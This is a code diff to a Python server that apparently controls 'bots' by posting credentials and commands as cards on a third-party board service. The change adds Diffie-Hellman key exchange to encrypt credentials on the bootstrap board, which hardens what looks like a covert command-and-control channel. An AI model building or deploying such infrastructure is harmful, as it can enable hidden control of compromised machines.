@@ -1,6 +1,9 @@
 import api_utils as utils
 import time
 import json
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import dh
+from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 
 
 available_bots_credentials = [
@@ -44,9 +47,16 @@ def initialize_new_bot(bootstrap_list_id, bot_id):
         return
 
     # post the new credentials on the bootstrap board
+
+    # In each credentials exchange, the server generates a new private key and a new public key.
+    key = utils.exchange_keys(utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, bootstrap_list_id, is_server=True)
+    if key is None:
+        print("ERROR: could not exchange keys")
+        return
     new_creds = new_key + utils.KEY_TOKEN_SEPERATOR + new_token
+    message = utils.encrypt(key, new_creds)
     if utils.create_card(utils.BOOTSTRAP_KEY, utils.BOOTSTRAP_TOKEN, bootstrap_list_id, utils.CRED_ANS_CARD_NAME,
-                         new_creds) < 0:
+                         message) < 0:
         print("ERROR: could not post credentials on bootstrap board")
         return
 
@@ -108,7 +118,7 @@ def check_bots_boards():
             print(
                 "ERROR: bot is unknown or wasn't initialized properly. bot id: " + bot_id)
             continue
-        print("bot id: " + bot_id + " executing commands: " + str(executing_command_ids_per_bot[bot_id]) + " finished commands: " + str(finished_command_ids_per_bot[bot_id]))
+        
         todo_list_id = utils.get_list_id(key, token, utils.TODO_LIST_NAME, board_id)
         done_list_id = utils.get_list_id(key, token, utils.DONE_LIST_NAME, board_id)
         if not todo_list_id or not done_list_id:
